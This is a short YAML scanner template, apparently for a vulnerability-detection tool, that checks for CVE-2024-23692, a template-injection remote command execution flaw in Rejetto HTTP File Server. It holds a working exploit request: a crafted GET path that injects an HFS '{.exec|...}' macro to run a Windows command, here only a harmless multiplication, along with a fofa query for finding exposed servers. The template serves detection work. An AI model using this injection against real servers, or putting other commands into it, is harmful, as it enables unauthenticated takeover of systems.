id: CVE-2024-23692
info: 
  name: HTTP File Server Template_injection
  author: laohuan12138
  severity: critical
  verified: true
  description: |
    fofa: "HttpFileServer"
    Rejetto HTTP文件服务器，直到并包括2.3m版本，都存在模板注入漏洞。此漏洞允许远程、未经认证的攻击者通过发送特制的HTTP请求在受影响的系统上执行任意命令

  references:
    - https://mp.weixin.qq.com/s/xVQ23j3orVYgdEM1ywpcZg
  tags: rce,cve,cve2024
  created: 2024/06/14

set:
  num1: randomInt(1000,9999)
  num2: randomInt(1000,9999)

rules:
  r0:
    request:
      method: GET
      path: /?n=%0A&cmd=cmd+/c+set+/A+{{num1}}*{{num2}}&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}
    expression: response.status == 200 && response.body.bcontains(b"RESULT") && response.body.bcontains(bytes(string(num1 * num2)))


expression: r0()